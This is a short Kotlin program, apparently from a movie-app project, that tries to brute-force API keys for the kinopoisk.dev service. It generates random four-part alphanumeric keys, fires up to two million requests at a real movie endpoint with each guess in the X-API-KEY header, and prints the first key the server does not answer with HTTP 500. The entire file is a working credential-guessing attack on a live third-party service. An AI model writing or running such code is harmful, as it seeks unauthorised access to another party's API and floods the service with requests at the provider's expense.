package com.sb.moovich

import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.UUID
import kotlin.random.Random

fun main() {
    val client = OkHttpClient()


    repeat(2000000) {
        try {
            val key = generateKey()
            val request = Request.Builder()
                .url("https://api.kinopoisk.dev/v1.4/movie/23523")
                .get()
                .addHeader("accept", "application/json")
                .addHeader("X-API-KEY", key)
                .build()
            val response = client.newCall(request).execute()
            if(response.code != 500) {
                println(key)
                return
            }
        }
       catch (e: Exception) {
           return
       }
    }

}
fun generateRandomString(length: Int): String {
    val charPool: List<Char> = ('A'..'Z') + ('0'..'9')
    return (1..length)
        .map { Random.nextInt(0, charPool.size) }
        .map(charPool::get)
        .joinToString("")
}

fun generateKey(): String {
    val part1 = generateRandomString(7)
    val part2 = generateRandomString(7)
    val part3 = generateRandomString(7)
    val part4 = generateRandomString(7)
    return "${part1.toUpperCase()}-${part2.toUpperCase()}-${part3.toUpperCase()}-${part4.toUpperCase()}"
}